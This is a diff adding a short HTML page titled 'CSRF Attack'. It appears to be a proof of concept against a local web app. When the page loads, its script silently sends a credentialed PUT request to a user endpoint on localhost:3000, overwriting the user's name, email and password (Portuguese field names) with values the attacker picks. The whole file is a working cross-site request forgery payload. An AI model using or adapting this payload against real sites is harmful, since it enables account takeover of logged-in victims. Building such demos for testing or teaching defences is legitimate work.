@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Attack</title>
+</head>
+<body>
+  <script>
+    fetch("http://localhost:3000/users/1", {
+      method: "PUT",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        nome: "csrf",
+        email: "csrf@ataque.com",
+        senha: "atacado"
+      }),
+      credentials: "include"
+    });
+  </script>
+</body>
+</html>
